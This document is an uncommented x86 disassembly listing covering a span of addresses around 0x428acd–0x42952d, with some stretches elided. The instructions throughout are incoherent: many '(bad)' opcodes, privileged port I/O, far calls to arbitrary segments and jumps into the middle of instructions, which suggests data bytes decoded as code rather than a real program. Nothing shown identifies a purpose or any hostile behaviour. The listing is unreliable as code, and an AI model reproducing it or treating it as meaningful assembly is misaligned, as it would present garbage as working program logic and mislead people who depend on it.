  428acd:	shl    DWORD PTR [ecx+0xaf6dede],0x79
  428ad4:	repnz cwde 
  428ad6:	dec    edx
  428ad7:	retf   
  428ad8:	mov    dh,0xe9
  428ada:	(bad)  
  428adb:	fist   WORD PTR [edx]
  428add:	and    DWORD PTR [edi+0x18],esi
  428ae0:	jns    0x428b2a
  428ae2:	mov    DWORD PTR [ecx],esp
  428ae4:	sub    esp,eax
  428ae6:	movhlps xmm1,xmm5
  428ae9:	xchg   ebx,eax
  428aea:	push   eax
  428aeb:	add    DWORD PTR [edi],0xffffff82
  428aee:	je     0x428b62
  428af0:	push   esi
  428af1:	mov    al,BYTE PTR [esi-0x76832441]
  428af7:	sub    BYTE PTR ds:0x260787f8,al
  428afd:	repz pop es
  428aff:	fisttp DWORD PTR [ebx]
  428b01:	push   esi
  428b02:	sbb    dh,al
  428b04:	inc    ebx
  428b05:	mov    esi,0xf1fbc92
  428b0a:	aam    0x1
  428b0c:	(bad)  
  428b0d:	fadd   DWORD PTR [esi+0x20]
  428b10:	inc    edi
  428b11:	pushw  ds
  428b13:	std    
  428b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b15:	fmul   st,st(7)
  428b17:	add    ch,al
  428b19:	jne    0x428b6a
  428b1b:	mov    ebx,0x420e24bb
  428b20:	and    eax,0x36427e42
  428b25:	inc    edi
  428b26:	jecxz  0x428b5e
  428b28:	addr16 ret 
  428b2a:	in     eax,dx
  428b2b:	dec    esi
  428b2c:	clc    
  428b2d:	out    dx,al
  428b2e:	jecxz  0x428aef
  428b30:	mov    bl,0xb1
  428b32:	rcr    DWORD PTR [eax-0x1d07c12d],cl
  428b38:	jbe    0x428b62
  428b3a:	pop    es
  428b3b:	sub    ecx,DWORD PTR [ebp-0x16b939c8]
  428b41:	pop    edx
  428b42:	jb     0x428b27
  428b44:	cs shl al,0x61
  428b48:	ds sahf 
  428b4a:	aaa    
  428b4b:	ss aaa 
  428b4d:	mov    al,0xd4
  428b4f:	jg     0x428b57
  428b51:	arpl   WORD PTR [esi+ebx*4-0x11],bx
  428b55:	jecxz  0x428b02
  428b57:	retf   
  428b58:	mov    eax,0x23613745
  428b5d:	hlt    
  428b5e:	jg     0x428b35
  428b60:	inc    esi
  428b61:	dec    ecx
  428b62:	dec    edi
  428b63:	(bad)  
  428b64:	pop    ebx
  428b65:	jg     0x428b69
  428b67:	mov    ds:0xb81f703b,al
  428b6c:	outs   dx,BYTE PTR ds:[esi]
  428b6d:	xchg   ebp,eax
  428b6e:	xor    eax,0x5ab98813
  428b73:	call   0x8f83:0x2e4f0e95
  428b7a:	jmp    0x2a18:0xac1b07ad
  428b81:	adc    bh,BYTE PTR ds:0x8c3a6466
  428b87:	ss mov cl,0xe5
  428b8a:	(bad)  
  428b8b:	dec    ebp
  428b8c:	nop
  428b8d:	push   esp
  428b8e:	cmp    ecx,ebx
	...
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0xa2c8edf1
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	jmp    FWORD PTR [ebp-0x18]
  428c0f:	(bad)  
  428c11:	mov    DWORD PTR [ebp+0xaee5d0c],edx
  428c17:	sbb    eax,0x1ee7ed59
  428c1d:	out    0x8d,al
  428c1f:	dec    edi
  428c20:	jbe    0x428c2b
  428c22:	mov    cl,0xe6
  428c24:	jp     0x428c8f
  428c26:	cli    
  428c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c28:	fcomip st,st(7)
  428c2a:	xchg   BYTE PTR [eax+ebp*2],bh
  428c2d:	inc    edi
  428c2e:	inc    esp
  428c2f:	lock or DWORD PTR [ebp+0x57670f3d],0xe3748919
  428c3a:	je     0x428c71
  428c3c:	daa    
  428c3d:	cmc    
  428c3e:	xlat   BYTE PTR ds:[ebx]
  428c3f:	fwait
  428c40:	out    dx,eax
  428c41:	mov    ds:0xac2bd906,al
  428c46:	(bad)  
  428c47:	out    0x40,al
  428c49:	dec    ebp
  428c4a:	stos   BYTE PTR es:[edi],al
  428c4b:	jo     0x428c29
  428c4d:	push   ebx
  428c4e:	jmp    0x428bf3
  428c50:	xchg   esp,eax
  428c51:	sub    BYTE PTR [edi-0x1effce51],cl
  428c57:	mov    dh,0x8c
  428c59:	push   ebp
  428c5a:	xchg   edx,eax
  428c5b:	imul   al
  428c5d:	mov    ebp,0xca43612d
  428c62:	and    DWORD PTR [edi],edi
  428c64:	cwde   
  428c65:	inc    eax
  428c66:	addr16 cmp bl,al
  428c69:	jo     0x428c97
  428c6b:	cmc    
  428c6c:	js     0x428c7c
  428c6e:	scas   eax,DWORD PTR es:[edi]
  428c6f:	retf   
  428c70:	loop   0x428bf8
  428c72:	cmp    al,0xcf
  428c74:	jo     0x428c80
  428c76:	stc    
  428c77:	addr16 jle 0x428c90
  428c7a:	rcr    DWORD PTR [esp+edx*4-0x390b93f2],1
  428c81:	pusha  
  428c82:	stc    
  428c83:	mov    edi,0x94d06bed
  428c88:	int3   
  428c89:	adc    bh,BYTE PTR [ecx+0x6f]
  428c8c:	adc    eax,DWORD PTR [ecx+ebx*4]
  428c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c90:	push   eax
  428c91:	and    bl,BYTE PTR [edx-0x6f]
  428c94:	aaa    
  428c95:	hlt    
  428c96:	icebp  
  428c97:	shl    bh,1
  428c99:	iret   
  428c9a:	stc    
  428c9b:	push   ecx
  428c9c:	fdecstp 
  428c9e:	push   ebx
  428c9f:	or     al,ah
  428ca1:	lods   al,BYTE PTR ds:[esi]
  428ca2:	repnz push esp
  428ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ca5:	repnz es push ecx
  428ca8:	scas   eax,DWORD PTR es:[edi]
  428ca9:	and    BYTE PTR [ebx],dl
  428cab:	fldcw  WORD PTR [esi]
  428cad:	fstp   st(4)
  428caf:	pop    eax
  428cb0:	xchg   ecx,eax
  428cb1:	adc    bh,BYTE PTR [esp+ebx*8-0x17]
  428cb5:	mov    cs,WORD PTR [ebp+0xfa8f346]
  428cbb:	add    DWORD PTR [ebp-0x697f98cb],eax
  428cc1:	inc    esp
  428cc2:	ror    DWORD PTR [ebx],0xfa
  428cc5:	out    0x13,al
  428cc7:	inc    esp
  428cc8:	xchg   DWORD PTR [ecx-0x38],edx
  428ccb:	mov    bl,0x87
  428ccd:	fnsave [ebx+0x41]
  428cd0:	rcr    cl,1
  428cd2:	xchg   edi,eax
  428cd3:	adc    eax,0x47e2183c
  428cd8:	test   eax,0xf7bd08a4
  428cdd:	and    eax,0xe723d095
  428ce2:	dec    edi
  428ce3:	std    
  428ce4:	jnp    0x428cd0
  428ce6:	shl    ebx,1
  428ce8:	pop    ecx
  428ce9:	pusha  
  428cea:	pop    eax
  428ceb:	pop    es
  428cec:	mov    edi,0x4fbc16c2
  428cf1:	lock adc ebp,DWORD PTR [edx-0x47]
  428cf5:	adc    eax,0x9f655d21
  428cfa:	dec    edx
  428cfb:	(bad)  
  428cfc:	push   edi
  428cfd:	ja     0x428d22
  428cff:	inc    eax
  428d00:	sbb    eax,0xb5496d56
  428d05:	xchg   esi,eax
  428d06:	add    ax,0xe335
  428d0a:	mov    edx,0x2b168cf8
  428d0f:	mov    ds:0x0,al
	...
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xdeb8
  428d82:	ja     0x428d57
  428d84:	pop    eax
  428d85:	mov    ah,0x1
  428d87:	add    BYTE PTR [ecx+eax*1],al
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	loopne 0x428d82
  428d8e:	mov    bh,0x3a
  428d90:	push   esp
  428d91:	jmp    0x428daa
  428d93:	jle    0x428df0
  428d95:	mov    al,ds:0xd9ab589b
  428d9a:	mov    edx,0xd4aa7bae
  428d9f:	xchg   BYTE PTR [ecx-0x68],bh
  428da2:	mov    ah,BYTE PTR [ebp-0x69f356fb]
  428da8:	call   0x8ce7:0xb073bbf6
  428daf:	mov    esi,0xb374202d
  428db4:	inc    ebp
  428db5:	or     bh,0x18
  428db8:	ins    BYTE PTR es:[edi],dx
  428db9:	lahf   
  428dba:	ret    0xbb5f
  428dbd:	test   ax,0x9aad
  428dc1:	aad    0xac
  428dc3:	push   edi
  428dc4:	aaa    
  428dc5:	add    eax,0x21b0d5a4
  428dca:	test   al,0x80
  428dcc:	cmp    ebp,DWORD PTR gs:[ebx+0x3f]
  428dd0:	xchg   edi,eax
  428dd1:	std    
  428dd2:	lea    esp,ds:0x2482b995
  428dd8:	jae    0x428e32
  428dda:	loop   0x428e23
  428ddc:	and    eax,esi
  428dde:	jnp    0x428e53
  428de0:	lock call 0xf33d:0x3fc02869
  428de8:	jb     0x428e45
  428dea:	add    ah,0x6
  428ded:	xchg   esi,eax
  428dee:	addr16 jnp 0x428e19
  428df1:	mov    BYTE PTR [ebx+eax*8-0x72],ah
  428df5:	xor    bl,dl
  428df7:	pop    ebp
  428df8:	fcom   QWORD PTR [esi-0x38]
  428dfb:	pop    esp
  428dfc:	mov    ah,0xcf
  428dfe:	dec    ebp
  428dff:	or     eax,0xebb01ada
  428e04:	test   DWORD PTR [ebx+0x56],edi
  428e07:	add    al,BYTE PTR cs:[edx]
  428e0a:	icebp  
  428e0b:	loopne 0x428dff
  428e0d:	aad    0xdb
  428e0f:	repnz leave 
  428e11:	jmp    0x428e7a
  428e13:	(bad)  
  428e15:	aaa    
  428e16:	cs int3 
  428e18:	in     al,0xb2
  428e1a:	mov    ebp,0xbe8e9fb0
  428e1f:	test   eax,0x8d483a1e
  428e24:	mov    al,ds:0x69b62982
  428e29:	and    DWORD PTR [esi+0x40fb08a7],0xe859f6b8
  428e33:	int3   
  428e34:	imul   esp,edx,0x50e12fc3
  428e3a:	add    al,0xfe
  428e3c:	add    ah,BYTE PTR [ebp+0x63e6688c]
  428e42:	mov    ebx,0x319f4620
  428e47:	add    esi,DWORD PTR [ebp+0x2642b6cf]
  428e4d:	call   0x5d28:0x36c2ec59
  428e54:	fmul   st(2),st
  428e56:	jns    0x428e17
  428e58:	jmp    0xc8518f76
  428e5d:	jecxz  0x428e59
  428e5f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  428e61:	mov    ah,0x68
  428e63:	enter  0xc17a,0x4c
  428e67:	and    al,0xac
  428e69:	jnp    0x428ebc
  428e6b:	out    dx,eax
  428e6c:	mov    bh,BYTE PTR [ecx]
  428e6e:	hlt    
  428e6f:	aad    0x22
  428e71:	fiadd  WORD PTR [ecx]
  428e73:	test   al,0xc4
  428e75:	xor    edx,DWORD PTR [ebx+0x6d]
  428e78:	sbb    ecx,eax
  428e7a:	cmp    al,0xed
  428e7c:	(bad)  
  428e7d:	jb     0x428eee
  428e7f:	sbb    ebx,DWORD PTR [esi+0xfacc5ee]
  428e85:	(bad)  
  428e86:	jp     0x428e73
  428e88:	xor    DWORD PTR [ecx+0x25],ecx
  428e8b:	sbb    BYTE PTR [ecx+0x240a63],dh
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x44
  428f01:	jl     0x428f48
  428f03:	enter  0xb55c,0x1
  428f07:	add    BYTE PTR [ecx+eax*1],al
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	jp     0x428f3b
  428f0e:	lods   al,BYTE PTR ds:[esi]
  428f0f:	in     al,0x86
  428f11:	int3   
  428f12:	push   ss
  428f13:	stos   DWORD PTR es:[edi],eax
  428f14:	rcl    ecx,0xa6
  428f17:	mov    ecx,ebp
  428f19:	xchg   ebp,eax
  428f1a:	jle    0x428f52
  428f1c:	int    0x4
  428f1e:	add    bh,bh
  428f20:	out    0x1d,al
  428f22:	(bad)  
  428f23:	scas   al,BYTE PTR es:[edi]
  428f24:	add    eax,0xc0cc6f5f
  428f29:	sbb    edi,0xd8d65f4b
  428f2f:	inc    esi
  428f30:	push   0x41
  428f32:	scas   eax,DWORD PTR es:[edi]
  428f33:	outs   dx,DWORD PTR ds:[esi]
  428f34:	inc    esi
  428f35:	jmp    0x7f87:0x6e82b059
  428f3c:	je     0x428f47
  428f3e:	adc    dh,ah
  428f40:	inc    ecx
  428f41:	mov    ebp,0x7786f245
  428f46:	sub    BYTE PTR [ecx],0x36
  428f49:	sub    DWORD PTR [eax],esi
  428f4b:	adc    DWORD PTR [edx-0x46],edx
  428f4e:	test   al,0x18
  428f50:	adc    esp,DWORD PTR [edi]
  428f52:	dec    ebp
  428f53:	lods   eax,DWORD PTR ds:[esi]
  428f54:	adc    eax,0x60cdfc7
  428f59:	fsubr  st,st(2)
  428f5b:	xchg   edi,eax
  428f5c:	ret    0x3cb8
  428f5f:	sar    DWORD PTR ds:0x8e932f70,cl
  428f65:	add    eax,0xb2635197
  428f6a:	xor    DWORD PTR [eax+0x2d7e2cbc],esi
  428f70:	or     al,0x71
  428f72:	rcr    edx,cl
  428f74:	pop    eax
  428f75:	stos   DWORD PTR es:[edi],eax
  428f76:	mov    edi,0x5bbcfed3
  428f7b:	pop    esp
  428f7c:	pop    esi
  428f7d:	and    eax,0x70ae9005
  428f82:	and    DWORD PTR [ebp+0x57],edi
  428f85:	jl     0x428f74
  428f87:	jns    0x428f12
  428f89:	cmp    eax,0x43407fe1
  428f8e:	pop    esp
  428f8f:	data16 jge 0x428ff8
  428f92:	fisub  DWORD PTR [ebp+0x206814bb]
  428f98:	lahf   
  428f99:	cld    
  428f9a:	sbb    dh,al
  428f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f9d:	mov    dh,0xff
  428f9f:	mov    ebx,0x68758304
  428fa4:	push   es
  428fa5:	sub    eax,0x629df4a6
  428faa:	mov    al,ds:0x82027843
  428faf:	push   esp
  428fb0:	mov    edx,0x96f8ccae
  428fb5:	cmp    DWORD PTR [eax+edx*4-0x24],ebp
  428fb9:	leave  
  428fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fbb:	imul   ebp,DWORD PTR gs:[edx],0xffffffd5
  428fbf:	int    0x18
  428fc1:	add    eax,0x3ed29ded
  428fc6:	call   0x360e:0x34668696
  428fcd:	das    
  428fce:	mov    ds:0x6ca29eda,eax
  428fd3:	mov    al,ds:0x3a42a0da
  428fd8:	adc    BYTE PTR [edi],bl
  428fda:	or     ah,bh
  428fdc:	aam    0x7e
  428fde:	mov    dl,0xa2
  428fe0:	xor    al,BYTE PTR [ebx+0x663f6598]
  428fe6:	popf   
  428fe7:	xor    eax,0x32f2c767
  428fec:	cld    
  428fed:	ins    BYTE PTR es:[edi],dx
  428fee:	ret    
  428fef:	mov    ah,0x15
  428ff1:	les    ebx,FWORD PTR [edi]
  428ff3:	sub    al,BYTE PTR [eax+ecx*4+0x7852d883]
  428ffa:	pop    ecx
  428ffb:	fwait
  428ffc:	or     al,0xaf
  428ffe:	sub    al,0x41
  429000:	push   ebx
  429001:	sti    
  429002:	lods   eax,DWORD PTR ds:[esi]
  429003:	cmp    bh,BYTE PTR [edx+0x24]
  429006:	mov    WORD PTR [eax-0x5c18c39b],fs
  42900c:	stos   DWORD PTR es:[edi],eax
  42900d:	arpl   sp,bx
  42900f:	ret    
	...
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0xcefc7b77
  429081:	ret    
  429082:	sbb    cl,0x60
  429085:	mov    dh,0x1
  429087:	add    BYTE PTR [ecx+eax*1],al
  42908a:	add    BYTE PTR [eax],al
  42908c:	test   DWORD PTR [eax+0x88303dd],ebp
  429092:	in     al,0xd0
  429094:	jno    0x429022
  429096:	(bad)  
  429097:	pop    edi
  429098:	cmp    DWORD PTR [bp-0x2c3a],ecx
  42909d:	test   eax,0xe7d4fddf
  4290a2:	mov    bx,0x1ba0
  4290a6:	push   0x5d
  4290a8:	addr16 js 0x429070
  4290ab:	les    edx,FWORD PTR [ebx-0x15510e79]
  4290b1:	inc    edx
  4290b2:	mov    edi,0xdfbc4b37
  4290b7:	aad    0x4d
  4290b9:	(bad)  
  4290ba:	push   0x5af754e6
  4290bf:	pop    esp
  4290c0:	and    al,BYTE PTR [esi-0x550949f1]
  4290c6:	stos   DWORD PTR es:[edi],eax
  4290c7:	push   cs
  4290c8:	jl     0x42906c
  4290ca:	mov    edx,0x64c41eaa
  4290cf:	in     eax,dx
  4290d0:	push   esi
  4290d1:	push   ecx
  4290d2:	imul   ebp,DWORD PTR [edi+0x3ba9df8e],0xffffffcc
  4290d9:	jmp    0x4290a3
  4290db:	inc    ebp
  4290dc:	xor    al,0x67
  4290de:	out    dx,al
  4290df:	inc    ebp
  4290e0:	add    DWORD PTR [esi-0x7b],ebx
  4290e3:	fnstsw WORD PTR [eax]
  4290e5:	(bad)  [edx-0x28]
  4290e8:	leave  
  4290e9:	mov    dl,0x7f
  4290eb:	(bad)
  4290ee:	aad    0x9f
  4290f0:	cmpxchg ebx,ebx
  4290f3:	ds sar esi,1
  4290f6:	(bad)  
  4290f7:	not    ah
  4290f9:	scas   eax,DWORD PTR es:[edi]
  4290fa:	mov    esp,0xf07ebd40
  4290ff:	jno    0x429103
  429101:	dec    esp
  429102:	aaa    
  429103:	out    0x7c,al
  429105:	test   BYTE PTR [ebp+esi*1-0x7c949c82],dh
  42910c:	push   ebp
  42910d:	popf   
  42910e:	call   0x5c20:0xb5a340ab
  429115:	in     al,dx
  429116:	(bad)  
  429117:	mov    ds:0x807b1e2e,al
  42911c:	or     BYTE PTR [edi],dl
  42911e:	push   eax
  42911f:	pop    ss
  429120:	add    cl,BYTE PTR [ebx-0x19]
  429123:	mov    esi,0xa4dca106
  429128:	sbb    al,0xf7
  42912a:	push   ebx
  42912b:	in     eax,0x6e
  42912d:	xor    dl,BYTE PTR [edx+0x22]
  429130:	and    al,0x69
  429132:	inc    BYTE PTR [eax]
  429134:	mov    BYTE PTR [ebx],cl
  429136:	xor    DWORD PTR [ecx-0xf3ba313],edx
  42913c:	clc    
  42913d:	push   eax
  42913e:	stos   DWORD PTR es:[edi],eax
  42913f:	dec    eax
  429140:	dec    esp
  429141:	rcr    DWORD PTR [edx],1
  429143:	jno    0x42915a
  429145:	pop    eax
  429146:	xor    eax,DWORD PTR [edi+0x23]
  429149:	test   ebx,0xf9c69116
  42914f:	xor    esp,esi
  429151:	push   0x7e91f33a
  429156:	or     BYTE PTR [edx-0x12],bh
  429159:	int    0x38
  42915b:	push   ds
  42915c:	(bad)  
  42915d:	adc    DWORD PTR [ebx-0x466d01cf],esp
  429163:	out    0x54,al
  429165:	mov    ds:0xc929ddc,al
  42916a:	jnp    0x429169
  42916c:	xchg   esp,eax
  42916d:	xor    eax,DWORD PTR [ecx]
  42916f:	mov    al,ds:0x6e0a7213
  429174:	jle    0x4291a3
  429176:	scas   al,BYTE PTR es:[edi]
  429177:	cmp    bh,BYTE PTR [esi+ecx*4+0x7a4b19aa]
  42917e:	xchg   esi,eax
  42917f:	repz cld 
  429181:	adc    eax,0x17da86ed
  429186:	out    dx,eax
  429187:	les    edi,FWORD PTR [esi]
  429189:	jp     0x429118
  42918b:	(bad)  
  42918c:	xchg   ecx,eax
  42918d:	mov    DWORD PTR [edx],ebp
  42918f:	xor    eax,DWORD PTR [eax]
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ebx+eiz*4+0x64722090],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [edx],bl
  42920d:	(bad)  
  42920e:	adc    eax,DWORD PTR [ecx-0x71]
  429211:	jle    0x429233
  429213:	inc    edi
  429214:	ret    
  429215:	push   es
  429216:	add    esi,DWORD PTR [ecx-0x76]
  429219:	dec    esp
  42921a:	cmp    ebp,esi
  42921c:	test   DWORD PTR [edi+0x1d],edi
  42921f:	push   0xffffffe7
  429221:	sub    BYTE PTR [edx+0x11],ah
  429224:	adc    al,0xe9
  429226:	jns    0x429279
  429228:	xor    ch,cl
  42922a:	pop    ebp
  42922b:	cmp    bh,bh
  42922d:	push   edi
  42922e:	mov    cs:0x3f86546,eax
  429234:	(bad)  
  429235:	jo     0x429218
  429237:	mov    ebp,0xaa584b97
  42923c:	mov    ah,0x82
  42923e:	mov    BYTE PTR [esi],dh
  429240:	adc    BYTE PTR [ebx-0x1c],cl
  429243:	dec    esi
  429244:	dec    ecx
  429245:	pop    edi
  429246:	jbe    0x429212
  429248:	cmp    DWORD PTR [ebx],edi
  42924a:	in     eax,dx
  42924b:	leave  
  42924c:	cld    
  42924d:	push   ebp
  42924e:	loopne 0x429235
  429250:	loop   0x4291dd
  429252:	cmc    
  429253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429254:	scas   eax,DWORD PTR es:[edi]
  429255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429256:	mov    WORD PTR [eax-0x80],?
  429259:	sbb    al,0xba
  42925b:	xor    esp,esi
  42925d:	cld    
  42925e:	test   ebx,edx
  429260:	ins    DWORD PTR es:[edi],dx
  429261:	jbe    0x4291e5
  429263:	rcl    DWORD PTR [ebp+0x1189b61b],0xd7
  42926a:	sti    
  42926b:	cmp    dh,BYTE PTR [edx-0x16]
  42926e:	xlat   BYTE PTR ds:[ebx]
  42926f:	loopne 0x42920c
  429271:	cmp    DWORD PTR [ebx+0x14],esp
  429274:	pop    ebx
  429275:	mov    bl,bl
  429277:	adc    DWORD PTR [eax+0x29],ebx
  42927a:	popf   
  42927b:	out    dx,eax
  42927c:	mov    al,ds:0x9987c48c
  429281:	(bad)  
  429282:	mov    ds:0x1fd2ed86,al
  429287:	adc    BYTE PTR [esi],dh
  429289:	mov    al,ds:0xc1f11a05
  42928e:	dec    edi
  42928f:	outs   dx,BYTE PTR ds:[esi]
  429290:	stos   DWORD PTR es:[edi],eax
  429291:	imul   BYTE PTR [edi+0x20]
  429294:	data16 xlat BYTE PTR ds:[ebx]
  429296:	push   edx
  429297:	daa    
  429298:	fisub  WORD PTR [edi+esi*2]
  42929b:	xchg   ebx,eax
  42929c:	mov    ds:0x93de5e00,al
  4292a1:	mov    ah,0x49
  4292a3:	(bad)  
  4292a4:	push   ss
  4292a5:	arpl   WORD PTR [ecx-0x39],si
  4292a8:	repnz daa 
  4292aa:	loopne 0x4292e6
  4292ac:	retf   
  4292ad:	sbb    bl,BYTE PTR ds:[ebx+0x52]
  4292b1:	mov    cs,WORD PTR [edi]
  4292b3:	mov    eax,ds:0xb0f902b6
  4292b8:	call   FWORD PTR [edi]
  4292ba:	mov    esi,DWORD PTR ds:0xc9939bd2
  4292c0:	fisubr DWORD PTR [ecx]
  4292c2:	int    0x9e
  4292c4:	inc    ecx
  4292c5:	mov    ah,0x14
  4292c7:	jb     0x42933a
  4292c9:	stos   BYTE PTR es:[edi],al
  4292ca:	jge    0x429294
  4292cc:	imul   ebx,edx,0x1d
  4292cf:	outs   dx,DWORD PTR ds:[esi]
  4292d0:	push   0x779e7ff4
  4292d5:	adc    DWORD PTR [edi],0x18
  4292d8:	xor    al,0x41
  4292da:	bnd call 0x5c4a9813
  4292e0:	sbb    eax,0x7176b238
  4292e5:	lods   al,BYTE PTR ds:[esi]
  4292e6:	mov    si,0x99b0
  4292ea:	push   cs
  4292eb:	popf   
  4292ec:	imul   eax,ebp,0xbae95ccc
  4292f2:	jnp    0x42931b
  4292f4:	push   es
  4292f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292f6:	push   cs
  4292f7:	fisttp WORD PTR [ecx]
  4292f9:	ret    0xeebb
  4292fc:	sub    BYTE PTR [edi+edi*8-0x50],al
  429300:	jecxz  0x429339
  429302:	in     al,0x1a
  429304:	rol    BYTE PTR [edx+edx*8-0x463974b6],cl
  42930b:	out    dx,eax
  42930c:	(bad)
	...
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x80
  429381:	jg     0x4293b7
  429383:	jl     0x4293ed
  429385:	mov    eax,0x1040001
  42938a:	add    BYTE PTR [eax],al
  42938c:	fst    st(7)
  42938e:	loop   0x429404
  429390:	add    DWORD PTR [ecx+ebx*1+0x78e3f77a],edi
  429397:	int    0x42
  429399:	xlat   BYTE PTR ds:[ebx]
  42939a:	cmp    ebp,DWORD PTR [edx]
  42939c:	rcl    DWORD PTR [esi-0x4],cl
  42939f:	sbb    eax,0x80f8f134
  4293a4:	xchg   ecx,eax
  4293a5:	push   esp
  4293a6:	jne    0x429340
  4293a8:	cmp    eax,0x51f82e95
  4293ad:	in     eax,0x3e
  4293af:	lods   al,BYTE PTR ds:[esi]
  4293b0:	mov    bh,0x78
  4293b2:	rcl    DWORD PTR [edi],0x54
  4293b5:	jle    0x429358
  4293b7:	stos   BYTE PTR es:[edi],al
  4293b8:	gs pop esi
  4293ba:	sub    al,BYTE PTR [edx-0x67]
  4293bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293be:	not    DWORD PTR [ebx-0x39]
  4293c1:	ss dec edx
  4293c3:	(bad)  [ebp+0x26]
  4293c6:	sub    eax,0x13116795
  4293cb:	push   0x72
  4293cd:	mov    dh,BYTE PTR [esp+ebp*8+0x46]
  4293d1:	dec    eax
  4293d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4293d3:	sub    BYTE PTR [edi],cl
  4293d5:	mov    cl,0x4d
  4293d7:	xor    esi,edi
  4293d9:	je     0x4293d9
  4293db:	add    edx,ebx
  4293dd:	push   es
  4293de:	cmp    DWORD PTR [ebp+0x60c69d6e],eax
  4293e4:	xchg   ecx,eax
  4293e5:	dec    esi
  4293e6:	fdivrp st(7),st
  4293e8:	inc    esp
  4293e9:	mov    al,0xf1
  4293eb:	pop    esi
  4293ec:	sub    dl,al
  4293ee:	inc    esp
  4293ef:	pusha  
  4293f0:	aam    0x96
  4293f2:	lea    edx,[eax+0x2b]
  4293f5:	mov    ds:0x648c97f7,eax
  4293fa:	sub    DWORD PTR [esi+0x12],eax
  4293fd:	imul   ebp,DWORD PTR [eax-0x63],0x4987566f
  429404:	and    BYTE PTR [ebp-0x43],0xb1
  429408:	fadd   st,st(3)
  42940a:	mov    ch,0xcd
  42940c:	or     dh,BYTE PTR [ebx]
  42940e:	ror    BYTE PTR [ecx+0x6478885f],1
  429414:	sub    DWORD PTR [ebp+0x1c6b7354],esi
  42941a:	adc    DWORD PTR [edi-0x7bd8cf93],ebp
  429420:	loopne 0x4293df
  429422:	jnp    0x429410
  429424:	lahf   
  429425:	lods   al,BYTE PTR ds:[esi]
  429426:	inc    esp
  429427:	and    al,0xc3
  429429:	cdq    
  42942a:	in     eax,dx
  42942b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42942c:	clc    
  42942d:	sbb    ch,BYTE PTR [edi+0x62830f25]
  429433:	inc    eax
  429434:	push   0xe0b301fd
  429439:	gs pop esi
  42943b:	ret    0xd850
  42943e:	mov    dh,0x7c
  429440:	sbb    BYTE PTR [ecx-0x4f],al
  429443:	adc    DWORD PTR [eax-0x4a],edi
  429446:	add    eax,0xd9366789
  42944b:	leave  
  42944c:	adc    bh,bh
  42944e:	mov    edi,0xcc8f04cb
  429453:	mov    edi,esp
  429455:	sbb    al,0x3d
  429457:	aam    0x66
  429459:	(bad)  
  42945a:	cwde   
  42945b:	dec    edx
  42945c:	in     al,dx
  42945d:	pop    es
  42945e:	sbb    BYTE PTR [edi-0x79],al
  429461:	test   esi,edx
  429463:	(bad)  
  429465:	mov    ?,WORD PTR [esi]
  429467:	test   eax,0x5aae433f
  42946c:	dec    ecx
  42946d:	sub    bh,ah
  42946f:	and    ch,BYTE PTR [esi+eiz*4]
  429472:	icebp  
  429473:	cmp    al,0x5a
  429475:	cmp    bh,cl
  429477:	adc    dh,BYTE PTR [ebp+0x16f6e699]
  42947d:	xchg   esi,eax
  42947e:	scas   eax,DWORD PTR es:[edi]
  42947f:	cmc    
  429480:	dec    esi
  429481:	dec    esp
  429482:	mov    ecx,0xb32cd74d
  429487:	mov    ch,BYTE PTR [edx+0x4e9ff9c]
  42948d:	sti    
  42948e:	mov    al,BYTE PTR [edi]
	...
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x76d202ea],dx
  429503:	sahf   
  429504:	ins    BYTE PTR es:[edi],dx
  429505:	mov    ecx,0x1040001
  42950a:	add    BYTE PTR [eax],al
  42950c:	je     0x429548
  42950e:	int3   
  42950f:	push   es
  429510:	test   BYTE PTR [edx],dh
  429512:	pop    edx
  429513:	cmc    
  429514:	fcmovnbe st,st(1)
  429516:	pop    ss
  429517:	sub    al,0x2d
  429519:	ficom  DWORD PTR [ecx+ebx*4-0x19]
  42951d:	ja     0x4294b5
  42951f:	jae    0x42958a
  429521:	jge    0x429583
  429523:	xlat   BYTE PTR ds:[ebx]
  429524:	mov    WORD PTR [ebx+0x1bdcd6af],?
  42952a:	xor    eax,DWORD PTR [edx+edi*2]
  42952d:	jne    0x429549
